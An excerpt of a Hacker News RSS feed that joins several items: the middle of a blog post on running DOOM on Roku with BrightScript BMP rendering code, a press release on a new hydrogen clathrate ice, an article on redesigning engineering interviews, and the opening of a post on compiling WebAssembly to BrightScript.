<div><figure><img data-attachment-id="2466" data-permalink="https://motley-coder.com/2020/12/23/doom-on-roku/bitmap_256_color/" data-orig-file="https://motley-coder.com/wp-content/uploads/2020/12/bitmap_256_color.bmp" data-orig-size="320,200" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="bitmap_256_color" data-image-description="" data-medium-file="https://motley-coder.com/wp-content/uploads/2020/12/bitmap_256_color.bmp" data-large-file="https://motley-coder.com/wp-content/uploads/2020/12/bitmap_256_color.bmp" loading="lazy" width="320" height="200" src="https://motley-coder.com/wp-content/uploads/2020/12/bitmap_256_color.bmp" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p>That was a great static test, but dynamic was bound to be slower since we’re writing a file each time. As an optimization, I would build the bitmap header once and store it in its own <code>roByteArray</code>. Roughly, the 256 color BMP format looks like:</p>



<figure><table><tbody><tr><td data-align="center">54 bytes of headers</td></tr><tr><td data-align="center">256 bytes of color palette</td></tr><tr><td data-align="center">320 * 200 bytes of pixels</td></tr></tbody></table></figure>







<p>Wikipedia <a href="https://en.wikipedia.org/wiki/BMP_file_format#Example_1">has much better examples</a>, though without a palette. For writing the headers, I was able to use a lot of the WebAssembly instructions I already implemented:</p>



<pre data-enlighter-language="visualbasic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">' Header
I32Store8(headers, &amp;H00, &amp;H42) 'B
I32Store8(headers, &amp;H01, &amp;H4D) 'M
I32Store(headers, &amp;H02, fileSize) ' FileSize
I32Store(headers, &amp;H06, 0) ' Reserved
I32Store(headers, &amp;H0A, dataOffset) ' DataOffset

'InfoHeader
I32Store(headers, &amp;H0E, 40) ' InfoHeader Size
I32Store(headers, &amp;H12, width) ' Width
I32Store(headers, &amp;H16, height) ' Height
I32Store16(headers, &amp;H1A, 1) ' Planes
I32Store16(headers, &amp;H1C, bitsPerPixel) ' BitsPerPixel
I32Store(headers, &amp;H1E, 0) ' Compression (BI_RGB No compression)
I32Store(headers, &amp;H22, 0) ' ImageSize (0 is valid for no compression)
I32Store(headers, &amp;H26, 2835) ' XpixelsPerM
I32Store(headers, &amp;H2A, 2835) ' YpixelsPerM
I32Store(headers, &amp;H2E, usedColors) ' UsedColors
I32Store(headers, &amp;H32, 0) ' ImportantColors</pre>



<p>And Finally for both writing and immediately reading the data into an <code>roBitmap</code>:</p>



<pre data-enlighter-language="visualbasic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">path = "tmp:/s"
m.surfaceHeaders.WriteFile(path)
If m.surfaceColorTable &lt;&gt; Invalid Then m.surfaceColorTable.AppendFile(path)
m.wasi_memory.AppendFile(path, pixelDataOffset, m.surfacePixelDataSize)
bitmap = CreateObject("roBitmap", path)
m.screen.DrawScaledObject(0, m.surfaceHeight, 1, -1, bitmap)
m.screen.SwapBuffers()</pre>



<p>In this case <code>m.screen</code> is an instance of an <a href="https://developer.roku.com/docs/references/brightscript/components/roscreen.md">roScreen</a>, which implements <a href="https://developer.roku.com/docs/references/brightscript/interfaces/ifdraw2d.md">ifDraw2D</a>, so effectively it’s a full screen canvas. The <code>m.surfaceColorTable</code> is the color palette, and <code>m.wasi_memory</code> is actually the entire memory of DOOM, of which we’re only writing a tiny portion which is the pixel data (<code>screen[0]</code> if you’re familiar with the DOOM source).</p>



<p>You might notice the call to <code>DrawScaledObject</code>; that’s because as I found out bitmaps actually store their rows in reverse order where the first row is the bottom of the image. In DOOM, the first row is the top of the image, hence the flip. I found out later BMP format actually has a mechanism to support both ways, by storing a negative number for height.</p>



<p>To make these functions readily callable from C was straightforward in <a href="https://github.com/TrevorSundberg/wasm2brs">wasm2brs</a>. By default we compile with <code>-Wl,--allow-undefined</code> and any undefined function is assumed to be defined by Roku. It’s important to remember that in WebAssembly, all pointers are integers, so the following functions (taken from our <code>roku.h</code>):</p>



<pre data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">void roku_create_surface(int bitsPerPixel, int w, int h);
void roku_set_surface_colors(void* colorTable);
void roku_draw_surface(void* pixelData);</pre>



<p>Defined in BrightScript look like (taken from our <code>roku.brs</code>):</p>



<pre data-enlighter-language="visualbasic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">Function roku_create_surface(bitsPerPixel As Integer, w As Integer, h As Integer) as Void
Function roku_set_surface_colors(colorTableOffset as Integer) as Void
Function roku_draw_surface(pixelDataOffset As Integer) as Void</pre>



<p>To my amazement when we called the above functions from DOOM’s <code>i_video.c</code>, it actually worked! After DOOM got through loading the WAD file, the intro screen popped up and it blew my mind.</p>



<h2>Input</h2>



<p>Every iteration of the DOOM loop pumps all available messages from the operating system and stores them in queue. Lucky for us that translates pretty well to the non-blocking BrightScript <a href="https://developer.roku.com/docs/references/brightscript/interfaces/ifmessageport.md#getmessage-as-dynamic">roPort.GetMessage()</a>. Moreover, by using an <a href="https://developer.roku.com/docs/references/brightscript/components/roscreen.md">roScreen</a> we now receive the <a href="https://developer.roku.com/docs/references/brightscript/events/rouniversalcontrolevent.md">roUniversalControl…</a></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://motley-coder.com/2020/12/23/doom-on-roku/">https://motley-coder.com/2020/12/23/doom-on-roku/</a></em></p>]]>
            </description>
            <link>https://motley-coder.com/2020/12/23/doom-on-roku/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25523891</guid>
            <pubDate>Thu, 24 Dec 2020 00:23:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A new form of ice with potential transport applications]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25523446">thread link</a>) | @finphil
<br/>
December 23, 2020 | https://nuadox.com/post/638336664435097600/new-ice-form | <a href="https://web.archive.org/web/*/https://nuadox.com/post/638336664435097600/new-ice-form">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="638336664435097600">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/638336664435097600/new-ice-form"><h2>A new form of ice with potential transport applications</h2></a>
                                <figure data-orig-height="810" data-orig-width="1440"><img src="https://64.media.tumblr.com/d0b9749550c7ac4969f8c3ff765eb624/ee8e7b17d97752a9-77/s1280x1920/d624b4582ba98afbe62176e5654c92d7218268a7.jpg" data-orig-height="810" data-orig-width="1440" width="1280" height="720" alt="image"></figure><p><b>- By <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.skoltech.ru%2Fen&amp;t=MmExMzU2NzM5ODNkZTM0ZjZjMzViMjA5ZDk5Y2QyYjhhODRlZTBhNSxDS1BDanZQZQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638336664435097600%2Fnew-ice-form&amp;m=0&amp;ts=1608915753">Skolkovo Institute of Science and Technology (Skoltech)</a> -</b></p><p>

Scientists from the United States, China and Russia have described the structure and properties of a novel hydrogen clathrate hydrate that forms at room temperature and relatively low pressure. Hydrogen hydrates are a potential solution for storage and transportation of hydrogen, the most environmentally friendly fuel.&nbsp;</p><p>The research was <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fjournals.aps.org%2Fprl%2Fabstract%2F10.1103%2FPhysRevLett.125.255702&amp;t=ZDdmNDMwZTI1NTJiOGQyZWNkMGNkODhkOWI3OTY3NTE2ZWVmYmU2YSxDS1BDanZQZQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638336664435097600%2Fnew-ice-form&amp;m=0&amp;ts=1608915753">published</a> in the journal <i>Physical Review Letters</i>.

<br></p><p>Ice is a highly complex substance that has multiple polymorphic modifications that keep growing in number as scientists make new discoveries. The physical properties of ice vary greatly, too: for example, hydrogen bonds become symmetric at high pressures, making it impossible to distinguish a single water molecule, whereas low pressures cause proton disorder, placing water molecules in many possible spatial orientations within the crystal structure. Ice around us, including snowflakes, is always proton-disordered. Ice can incorporate xenon, chlorine, carbon dioxide or methane molecules and form gas hydrates which often have a different structure from pure ice. The vast bulk of Earth’s natural gas exists in the form of gas hydrates.</p><p>In their new study, chemists from the United States, China and Russia focused on hydrogen hydrates. Gas hydrates hold great interest both for theoretical research and practical applications, such as hydrogen storage. If stored in its natural form, hydrogen poses an explosion hazard, whereas density is way too low even in compressed hydrogen. That is why scientists are looking for cost-effective hydrogen storage solutions.</p><p>“This is not the first time we turn to hydrogen hydrates. In our previous research, we <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.nature.com%2Farticles%2Fsrep05606%3Ftrendmd-shared%3D0&amp;t=NDZiZjNiYzlmNmY1NWQ1NTA2ZjViNTQ2YTExZjc4ZTZlN2VhNjgxYSxDS1BDanZQZQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638336664435097600%2Fnew-ice-form&amp;m=0&amp;ts=1608915753">predicted</a> a novel hydrogen hydrate with 2 hydrogen molecules per water molecule. Unfortunately, this exceptional hydrate can only exist at pressures above 380,000 atmospheres, which is easy to achieve in the lab, but is hardly usable in practical applications. Our new paper describes hydrates that contain less hydrogen but can exist at much lower pressures,” Skoltech professor Artem R. Oganov says.<br></p><p>The crystal structure of hydrogen hydrates strongly depends on pressure. At low pressures, it has large cavities which, according to Oganov, resemble Chinese lanterns, each accommodating hydrogen molecules. As pressure increases, the structure becomes denser, with more hydrogen molecules packed into the crystal structure, although their degrees of freedom become significantly fewer.</p><p>In their research published in the <i>Physical Review Letters</i>, the scientists from the Carnegie Institution of Washington (USA) and the Institute of Solid State Physics in Hefei (China) led by Alexander F. Goncharov, a Professor at these two institutions, performed experiments to study the properties of various hydrogen hydrates and discovered an unusual hydrate with 3 water molecules per hydrogen molecule. The team led by Professor Oganov used the USPEX evolutionary algorithm developed by Oganov and his students to puzzle out the compound’s structure responsible for its peculiar behavior. The researchers simulated the conditions used in the experiment and found a new structure very similar to the known proton-ordered C1 hydrate but differing from C1 in water molecule orientations. The team showed that proton disorder should occur at room temperature, thus explaining the X-ray diffraction and Raman spectrum data obtained in the experiment.</p><p>–</p><p><i>Header image:&nbsp;A novel hydrogen clathrate hydrate. Credit:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.skoltech.ru%2Fen%2F2020%2F12%2Fchemists-describe-a-new-form-of-ice%2F&amp;t=NjVhYjgyNTIxNjRiMTQzNDYzYWZjMmQzMmU3NTJkNzJlZmIyMjg1MyxDS1BDanZQZQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638336664435097600%2Fnew-ice-form&amp;m=0&amp;ts=1608915753">Pavel Odinev / Skoltech</a>.</i></p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.skoltech.ru%2Fen%2F2020%2F12%2Fchemists-describe-a-new-form-of-ice%2F&amp;t=NjVhYjgyNTIxNjRiMTQzNDYzYWZjMmQzMmU3NTJkNzJlZmIyMjg1MyxDS1BDanZQZQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638336664435097600%2Fnew-ice-form&amp;m=0&amp;ts=1608915753">Skolkovo Institute of Science and Technology (Skoltech)</a></b></p><p><b>Full study:</b>&nbsp;“Novel Hydrogen Clathrate Hydrate”, <i>Physical Review Letters</i>.</p><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdoi.org%2F10.1103%2FPhysRevLett.125.255702&amp;t=ZGJjYTA5OGI0NTJlMzBiZGZjZGVjNTc4YzJjNGE1MzM5NDY1NTA2ZixDS1BDanZQZQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638336664435097600%2Fnew-ice-form&amp;m=0&amp;ts=1608915753">https://doi.org/10.1103/PhysRevLett.125.255702</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/628179785660694528/how-dangerous-are-burning-electric-cars">How dangerous are burning electric cars?</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/ice">ice</a>
                                    
                                        <a href="https://nuadox.com/tagged/hydrogen">hydrogen</a>
                                    
                                        <a href="https://nuadox.com/tagged/transportation">transportation</a>
                                    
                                        <a href="https://nuadox.com/tagged/transport">transport</a>
                                    
                                        <a href="https://nuadox.com/tagged/safety">safety</a>
                                    
                                        <a href="https://nuadox.com/tagged/materials">materials</a>
                                    
                                        <a href="https://nuadox.com/tagged/chemistry">chemistry</a>
                                    
                                    </p>
                                </span></p>
                                
                            </div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/638336664435097600/new-ice-form</link>
            <guid isPermaLink="false">hacker-news-small-sites-25523446</guid>
            <pubDate>Wed, 23 Dec 2020 23:22:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[3 Things to Know Before Rethinking Your Engineering Interview Process]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25523340">thread link</a>) | @eric_cartman
<br/>
December 23, 2020 | https://blogboard.io/blog/rethinking-engineering-interviews/ | <a href="https://web.archive.org/web/*/https://blogboard.io/blog/rethinking-engineering-interviews/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://images.unsplash.com/photo-1590945213328-ab2d0bbd1e88?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDM3fHxlbXB0eSUyMGNoYWlyfGVufDB8fHw&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 300w,
                            https://images.unsplash.com/photo-1590945213328-ab2d0bbd1e88?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDM3fHxlbXB0eSUyMGNoYWlyfGVufDB8fHw&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 600w,
                            https://images.unsplash.com/photo-1590945213328-ab2d0bbd1e88?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDM3fHxlbXB0eSUyMGNoYWlyfGVufDB8fHw&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 1000w,
                            https://images.unsplash.com/photo-1590945213328-ab2d0bbd1e88?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDM3fHxlbXB0eSUyMGNoYWlyfGVufDB8fHw&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://images.unsplash.com/photo-1590945213328-ab2d0bbd1e88?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDM3fHxlbXB0eSUyMGNoYWlyfGVufDB8fHw&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="3 Things to Know Before Rethinking Your Engineering Interview Process">
            </figure>

            <section>
                <div>
                    <p>On the surface, software engineering interviews look pretty much the same in any company. You usually have a phone call with a recruiter, followed by either a short technical round or a set of take home exercises. If you pass that you're invited for several rounds of on-site interviews, focusing on your technical abilities and behavioral cues that could predict your job performance and how you'll get along with the team.</p><p>However, if you simply take this format, pick a set of technical questions for the specific role and go with it, you could soon find yourself thinking about how to improve the process. You might find it slow and tedious for the interviewers; you could start seeing evaluations for the same candidate that widely differ depending on the interviewer; you could get feedback from the candidates that the process requires too much of a time investment for them.</p><p>In this post we'll summarize lessons shared on official engineering blogs of several companies. Namely, the advice falls down into three sections:</p><ol><li>Know what you are looking for</li><li>Be ready to iterate</li><li>Techniques to avoid bias</li></ol><p>If you're curious and want to find more stories about engineering interviews and hiring process, you should try <a href="https://blogboard.io/search?searchQuery=engineering%20interviews">Blogboard search</a>.</p><h2 id="know-what-you-are-looking-for">Know what you are looking for</h2><p>You want to hire an engineer, and you want to hire a great one. But the exact definition of "great" can depend on many factors, so a one-size-fits-all list of traits is unlikely to exist. </p><p>Are you a big company or a startup, what's the current state of the project and the team, are you hiring for a junior or a senior role? These are some of the obvious things to consider when thinking about the best fit for the role. Once you're clear on this you can work out the details and the exact qualities you're looking for in a candidate. Finally, all this will determine what you screen for and what your interview scorecards need to look like.</p><p>In a Lyft Engineering blog post <a href="https://eng.lyft.com/how-lyft-designs-the-machine-learning-software-engineering-interview-bbbb9fc8bb28">How Lyft Designs the Machine Learning Software Engineering Interview</a>, Hao Yi Ong states the following three questions to ask in order to understand what you actually want from a role you're hiring for:</p><blockquote>1. What are Lyft’s challenges (and can a specific role help)?<br>2. What should the role be with respect to the organization’s goals?<br>3. What are the desired skills, knowledge, and talents given the expectations for the role?</blockquote><p>Companies are more or less transparent about detailed requirements for the roles. The above-mentioned article briefly describes them as follows:</p><blockquote>Our desired talents are <em><em>recurring patterns of thought, feeling, and behavior that can be productively applied</em></em> in the context of Lyft’s ML SWE role. What we’re looking for here is a bit more complicated than simply work done in the past by a candidate. Faced with the same stimuli, people react and behave differently. When we look for role and values fit, we do mean just that. Beyond skills and knowledge, will a candidate’s unique way of responding to the problems thrown up in Lyft’s business context help that candidate succeed? So while conventional wisdom might suggest it, we’re not always looking for the Michael Jordans of machine learning (be it I. or J.). The narrow sort of talents associated with celebrated excellence can be important but in most cases the interviewers are listening for predictive clues of how a candidate will react when posed Lyft-specific problems on the job.</blockquote><p>Speaking about high level qualities of successful engineers, here's what Ted Tomlinson of Databricks shares in his article <a href="https://databricks.com/blog/2020/01/22/engineering-intervews-a-hiring-managers-guide.html">Engineering Interviews — A Hiring Manager’s Guide to Standing Out</a>:</p><blockquote>At a startup like Databricks, the most important quality I’ve seen in successful engineers is ownership. We are growing quickly, which brings a lot of new challenges every week, but it’s not always clear how responsibilities divide across teams and priorities get determined. Great engineers handle this ambiguity by surfacing the most impactful problems to work on, not just those limited to their current team’s responsibilities. Sometimes this means directly helping to build the solution, but often it’s motivating others to prioritize the work.<p>The second quality we focus on, particularly for those earlier in their career, is the ability to learn and grow. The derivative of knowledge is often more important than a candidate’s current technical skills. Many of the engineering problems we are solving don’t have existing templates to follow. That means continually breaking through layers of abstraction to consider the larger system – from the lowest level of cpu instructions, up to how visualizations are rendered in the browser.</p></blockquote><p>Going back to tailoring the requirements to the needs of your company, notice that Ted points out that <em>ownership</em> is <em>the most important quality at a startup like Databricks, </em>suggesting that wouldn't necessarily be equally important at a different place.</p><p>Once you've figured out the qualities you're looking for, you can go deeper and break them down into fine-grained categories that you can actually screen for in an interview. Medium Engineering shares a great example of how this can be done. In <a href="https://medium.engineering/engineering-interviews-what-we-screen-for-af2d84122417">Engineering interviews: what we screen for</a>, Jamie Talbot explains how at Medium they're looking for three things: (1) Can they build software? (2) Can they learn and teach? (3) Are they aligned with our values?</p><p>Each of these high level requirements is then broken down into six sub-categories. For example <em>ability to build software </em>covers the following categories:</p><ul><li>Problem solving</li><li>Code fluency</li><li>Autonomy</li><li>Basic computer science knowledge</li><li>System design</li><li>Resoluteness</li></ul><p>If you're curious, each capability is described in detail in the <a href="https://medium.engineering/engineering-interviews-what-we-screen-for-af2d84122417">blog post</a>. In addition to that, the team at Medium devised a detailed grading guideline for each category, helping interviewers decide on the scale of <em>Strong No &gt; No &gt; Mixed &gt; Yes &gt; Strong Yes. </em>They describe it in another article <a href="https://medium.engineering/engineering-interviews-grading-rubric-8b409bec021f">here</a>.</p><p>With any problem, hiring being no exception, it helps to know why you're doing it and what your environment and constraints are. Only then you can come up with creative and more effective solutions.</p><p>Speaking of constraints, they're likely to change over time, rendering your existing interview process inefficient.</p><h2 id="be-ready-to-iterate">Be ready to iterate</h2><p>There's several reasons for being flexible and ready to adapt your technical interview process. </p><p>In the previous part we discussed how you need to tailor your interviews to fit your company, project and team needs. Inevitably, these things will change over time, and with that your interview process will likely need to change as well.</p><p>On that note, when reading through company blogs a recurring theme is <em>redesign</em> of the interview process. It usually happens because circumstances change, but often (as with any process) you can find room for improvement even when the environment hasn't changed much. </p><p>At Medium they noticed more than a few things they thought need improvement. As elaborated in <a href="https://medium.engineering/engineering-interviews-refining-our-process-52fbc9510e91">Engineering interviews: refining our process</a> they wanted to address lack of clarity in capability requirements, inconsistencies in candidate evaluation, which traits are considered important and which less so, how they approach personality traits and non-technical qualities.</p><p>At The New York Times, they recognized the need to standardize the hiring process across the company, as it's recognized to be the key determining factor for the culture. One of the things where a consolidated interview process helped is increased trust for internal mobility. Due to lack of trust among teams, it could happen that an engineer would be required to pass a technical interview if they were to change teams. You can read about this on the NYT Open, the official behind-the-scenes blog of The New York Times (namely these two articles: <a href="https://open.nytimes.com/how-we-designed-our-front-end-engineer-hiring-process-9b8f20cc31fb">How We Designed Our Front-End Engineer Hiring Process</a>, <a href="https://open.nytimes.com/how-we-hire-front-end-engineers-at-the-new-york-times-e1294ea8e3f8">How We Hire Front-End Engineers at The New York Times</a>).</p><p>In <a href="https://slack.engineering/refactoring-backend-engineering-hiring-at-slack/">Refactoring Backend Engineering Hiring at Slack</a>, Slack engineers share the story of why and how they optimized the take-home exercise. Although it had many points in its favor, the exercise was a bottleneck in their hiring process. Candidates, wanting to show off the best of their skills, would take too much time to complete the exercise. Slack, on the other hand, was in state of rapid growth and the projected time for staffing all the necessary positions simply was too long:</p><blockquote>The end result was that, by our estimates, it would have taken a year to fill our existing open headcount, future growth aside. This timeframe clearly would not allow us to grow at the speed we needed. However, we were also unwilling to sacrifice quality. We needed an approach that would give us good signal and help us hire great engineers, but at a reduced time cost to the candidate and to us. <p>To satisfy these needs, we decided to create two new take-home exercises: an API design exercise and a code review exercise. In creating these exercises, we sought to create a problem that was not an onerous time investment on the part of the candidate. We wanted something that would give us good signal on the attributes we cared about while taking at most two hours to complete.</p></blockquote><p>Finally, the team at Slack came up with a new format for the challenge as well as internal apps and GitHub automations to streamline the process, resulting in significant measurable improvement:</p><blockquote>In the end, we saw tangible improvements against our goals. We saw a decrease in our time-to-hire — the time from when a recruiter first reaches out, to the candidate’s first day in the office. The time-to-hire metric decreased from an average of 200 days to below 83 days — and it continues to drop. We’ve seen positive feedback from candidates and employees in all parts of the process.</blockquote><p>At Soundcloud, the team attacked the same part of the interview funnel - the take-home exercise, since they noticed it often takes far too long to complete it. As they point out <a href="https://developers.soundcloud.com/blog/rethinking-the-backend-code-challenge#fnref-1">in this article</a>, …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blogboard.io/blog/rethinking-engineering-interviews/">https://blogboard.io/blog/rethinking-engineering-interviews/</a></em></p>]]>
            </description>
            <link>https://blogboard.io/blog/rethinking-engineering-interviews/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25523340</guid>
            <pubDate>Wed, 23 Dec 2020 23:07:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: WebAssembly running on the Roku (C/C++/Rust)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25523336">thread link</a>) | @TrevorSundberg
<br/>
December 23, 2020 | https://motley-coder.com/2020/12/20/webassembly-on-roku/ | <a href="https://web.archive.org/web/*/https://motley-coder.com/2020/12/20/webassembly-on-roku/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>For the source code, visit my github: <a href="https://github.com/TrevorSundberg/wasm2brs">https://github.com/TrevorSundberg/wasm2brs</a></p>



<p>I’ve been of huge fan of the TCL + Roku series of TVs. I’m a simple person with simple pleasures, and the button on the remote that instantly turns on the TV and goes to Netflix won me over. As with most technology, it didn’t take long for me to start tinkering.</p>



<p>Roku’s app development platform requires that all apps are written in a proprietary language known as BrightScript. It’s a dynamic language with limited optional types. After playing in BrightScript for a bit, I found myself searching “<em>How to compile C++ for Roku?</em>” only to realize that C++ support was discontinued or locked behind partnerships and NDAs.</p>



<h2>Path to C/C++ in BrightScript</h2>



<p>Up front I knew I was going to need to do some translating. The immediate options available were:</p>



<ul><li>C++ directly to BrightScript</li><li>C++ to LLVM bitcode to BrightScript</li><li>C++ to WebAssembly to BrightScript</li></ul>







<p>Translation of the C++ AST provided by clang was a no-go due to the complexity of having to convert classes, operators, templates, etc. LLVM looked attractive because it boils down to basic instructions, pointers, and structs, and is a supported output by many languages. Ultimately I chose WebAssembly over LLVM bitcode because the number of instructions was smaller, there is no concept of structs (only bytes), pointers are just integers with no special type, and the linear memory model for WASM was simple.</p>



<p>When I started, I looked for a parser for .wasm files which led me to <a href="https://github.com/WebAssembly/wabt">wabt</a>, The WebAssembly Binary Toolkit. My first approach was going to be parse the .wasm, walk over instructions, generate variables, and emit BrightScript. This proved to be a little more complicated than I expected as I didn’t fully understand the type and label stack, or even how the <a href="https://webassembly.github.io/spec/core/syntax/instructions.html#syntax-instr-control">br</a> instruction jumps <em>after</em> the block, instead of to it like in LLVM. However in the <a href="https://github.com/WebAssembly/wabt">wabt</a> repository I came across <em>wasm2c</em>, a simple command line interface for translating WebAssembly into C. This gave me a clearer picture of the workings of WebAssembly and a template to work from, now called <a href="https://github.com/TrevorSundberg/wasm2brs">wasm2brs</a> for WebAssembly To BrightScript. All I needed to do was modify the output of <em>wasm2c</em> to match BrightScript syntax.</p>



<h2>First Run</h2>



<p>To start I picked a simple example of adding integers with no imports, memory, globals, etc. You can use the <a href="https://github.com/WebAssembly/wabt">wabt</a> tool <em>wat2wasm</em> to convert this into a .wasm file:</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">(func (export "add") (param $x i32) (param $y i32) (result i32)
    (i32.add
        (local.get $x)
        (local.get $y)
    )
)</pre>



<p>In fact it was so useful to be able to run on both .wat and .wasm files that I ended up integrating the source of <em>wat2wasm</em> into <a href="https://github.com/TrevorSundberg/wasm2brs">wasm2brs</a>.</p>



<p>After some slight modification of the original <em>wasm2c</em> project, I was able to output the following BrightScript:</p>



<pre data-enlighter-language="visualbasic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">Function w2b_add(w2b_x As Integer, w2b_y As Integer) As Integer
  w2b_i0 = w2b_x
  w2b_i1 = w2b_y
  w2b_i0 += w2b_i1
  Return w2b_i0
End Function</pre>







<p>Ta-da! It actually worked and produced valid code that ran on the Roku. I was ecstatic at this point, but I was also piggybacking on the fact that <em>wasm2c</em> was able to use all of C’s built in operators such as <code>+=</code> which happens to exist in BrightScript.</p>



<h2>Memory</h2>



<p>Though I would love to see more added to BrightScript’s standard library, the component <a href="https://developer.roku.com/docs/references/brightscript/components/robytearray.md">roByteArray</a> would serve nicely as our basis for implementing WebAssembly’s memory model. As a side note, <a href="https://developer.roku.com/docs/references/brightscript/components/robytearray.md">roByteArray</a> is simply an object, but for the documentation of all of its functions you must look at all the interfaces it implements, with <a href="https://developer.roku.com/docs/references/brightscript/interfaces/ifbytearray.md">ifByteArray</a> being one of them. Unfortunately as you might notice by scanning the interface, the only methods they have to reading and writing to it involve reading single bytes with the index[n] operator or <a href="https://developer.roku.com/docs/references/brightscript/interfaces/ifbytearray.md#getsignedbyteindex-as-integer-as-integer">GetSignedByte(n)</a>. There is no similar functions to JavaScript’s <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView">DataView</a> where you can call <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView/getInt32">getInt32(n)</a> and read a 32 bit integer. At best they have <a href="https://developer.roku.com/docs/references/brightscript/interfaces/ifbytearray.md#getsignedlongindex-as-integer-as-integer">GetSignedLong(n)</a>, except that it’s undocumented that <code>n</code> in this case actually jumps by 4 bytes (<code>index = n * 4</code>). This means it does not support unaligned loads, which is required by WebAssembly.</p>



<p>This presented a problem: we’re going to have to do everything in bytes. Roku employees, if you’re reading this, please add all the methods from <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView">DataView</a> :)</p>



<p>To implement <em>i32.load</em> which loads a 32 bit integer from memory, I modified <a href="https://github.com/TrevorSundberg/wasm2brs">wasm2brs</a> to emit a function call to the following:</p>



